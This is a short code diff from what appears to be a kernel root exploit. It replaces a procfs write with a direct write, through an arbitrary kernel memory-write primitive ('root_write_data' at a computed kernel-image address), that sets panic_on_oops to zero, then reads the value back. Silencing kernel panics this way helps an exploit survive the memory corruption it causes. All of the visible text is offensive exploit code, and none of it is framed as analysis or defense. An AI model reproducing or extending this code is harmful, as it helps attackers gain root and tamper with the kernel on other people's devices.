@@ -539,14 +539,15 @@ static int install_workqueue_umh_root(int fd) {
   result = socket_ok;
 
   if (result) {
-    int poo_fd = open("/proc/sys/kernel/panic_on_oops", O_WRONLY);
-    if (poo_fd >= 0) {
-      int w = write(poo_fd, "0\n", 2);
-      close(poo_fd);
-      pr_info("panic_on_oops set to 0 (write=%d)\n", w);
-    } else {
-      pr_warning("panic_on_oops open failed errno=%d\n", errno);
-    }
+#if defined(PANIC_ON_OOPS_OFF)
+    uint32_t poo_val = 0;
+    uintptr_t poo_direct = data_direct_addr(KIMAGE_TEXT_BASE + PANIC_ON_OOPS_OFF);
+    int poo_w = root_write_data(fd, poo_direct, &poo_val, sizeof(poo_val));
+    uint32_t poo_read = 0xff;
+    root_read_data(fd, poo_direct, &poo_read, sizeof(poo_read));
+    pr_info("panic_on_oops write=%d readback=%u addr=%016zx\n",
+            poo_w, poo_read, poo_direct);
+#endif
   }
 
 cleanup:
